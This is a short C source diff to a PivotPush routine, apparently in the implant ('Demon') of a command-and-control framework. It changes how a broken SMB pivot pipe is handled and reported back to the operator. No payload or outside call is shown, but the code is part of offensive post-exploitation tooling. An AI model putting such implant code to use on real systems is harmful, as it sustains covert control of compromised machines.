@@ -234,7 +234,6 @@ VOID PivotPush()
     DWORD       Length    = 0;
     PVOID       Output    = NULL;
 
-    // TODO: send everything back.
     do
     {
         if ( ! TempList )
@@ -277,10 +276,6 @@ VOID PivotPush()
                     {
                         PUTS( "ERROR_BROKEN_PIPE. Remove pivot" )
 
-                        /* Sends already read data. */
-                        PackageTransmit( Package, NULL, NULL );
-
-                        PUTS( "1" )
                         DWORD DemonID = TempList->DemonID;
                         BOOL  Removed = PivotRemove( TempList->DemonID );
 
@@ -291,15 +286,12 @@ VOID PivotPush()
                         PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
                         PackageAddInt32( Package, Removed );
                         PackageAddInt32( Package, DemonID );
-
                         PackageTransmit( Package, NULL, NULL );
 
-                        return;
+                        break;
                     }
 
                     CALLBACK_GETLASTERROR
-                    PackageDestroy( Package );
-
                     break;
                 }
 
